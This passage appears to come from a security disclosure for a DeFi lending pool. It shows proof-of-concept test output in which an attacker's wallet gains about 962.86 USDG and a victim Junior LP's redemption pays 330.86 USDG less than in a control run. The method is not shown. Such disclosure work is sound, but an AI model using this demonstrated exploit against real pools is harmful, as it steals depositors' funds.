    Junior principal (USDG atoms)      749881458168
    Senior principal (USDG atoms)      500010133724
    pool totalAssets (USDG atoms)      1249891591892
    Junior LP redeems 25% -> USDG      249960152778
    Junior value (principal + redeemed) 999841610946
    rounds voided / executed           0 6
  attacker net USDG, with lever (signed atoms)
  962858939
  attacker net USDG, passive (signed atoms)
  -435759611
  Junior LPs lose vs control (total Junior value, signed atoms)
  1323425638
  Junior LP's real 25% redemption is lower by (signed atoms)
  330856079

Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 284.59ms (273.99ms CPU time)
```

```
    account                         before            after             delta
    ATTACKER wallet                 300000.000000     300962.858939     +962.858939
    VICTIM Junior LP 25% redemption 250031.488276     249700.632197     -330.856079
```

The attacker's own USDG wallet took 962.858939 USDG, and the Junior LP's real redemption of the identical 25% of shares paid out 330.856079 USDG less than in the no-attacker control over the same path.

